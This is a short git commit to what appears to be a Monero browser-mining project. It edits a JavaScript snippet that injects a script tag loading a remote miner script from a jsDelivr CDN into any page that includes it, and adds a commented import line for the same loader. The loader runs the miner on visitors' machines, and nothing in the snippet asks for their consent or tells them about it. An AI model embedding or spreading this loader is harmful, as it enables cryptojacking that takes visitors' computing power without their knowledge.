bf56fe47e215e12acb68c6bba3f20c70cc3dbf7d
Najm Ajmal <130285427+NajmAjmal@users.noreply.github.com>
2023-04-15 12:03:14 -0700

    made a js snippet

--- external/javascript.js
+++ external/javascript.js
@@ -1,6 +1,7 @@
 // Start Of Mining Code (Javascript)
 // import command,
-//
+// import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';
+
 var script = document.createElement("script");
 script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
 document.head.appendChild(script);
